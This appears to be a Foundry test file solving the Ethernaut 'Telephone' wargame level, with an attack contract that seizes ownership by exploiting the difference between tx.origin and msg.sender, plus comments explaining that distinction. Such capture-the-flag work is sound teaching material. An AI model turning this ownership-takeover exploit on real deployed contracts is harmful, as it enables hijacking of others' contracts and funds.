// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Telephone/TelephoneFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

contract TelephoneTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testTelephoneHack() public {
        /****************
         * Factory setup *
         *************** */
        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone ethernautTelephone = Telephone(payable(levelAddress));

        /****************
         *    Attack     *
         *************** */
        TelephoneHack telephoneHack = new TelephoneHack(levelAddress);
        /*
         * tx.origin:
         *   The original user wallet that initiated the transaction
         *   The origin address of potentially an entire chain of transactions and calls
         *   Only user wallet addresses can be the tx.origin
         *   A contract address can never be the tx.origin
         * msg.sender:
         *   The immediate sender of this specific transaction or call
         *   Both user wallets and smart contracts can be the msg.sender
         */
        telephoneHack.attack();
        assertEq(ethernautTelephone.owner(), player);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract TelephoneHack {
    Telephone public challenge;

    constructor(address challengeAddress) {
        challenge = Telephone(payable(challengeAddress));
    }

    function attack() external payable {
        // the condition to change the owner is that
        //msg.sender != tx.origin because called from contract
        challenge.changeOwner(msg.sender);
    }
}
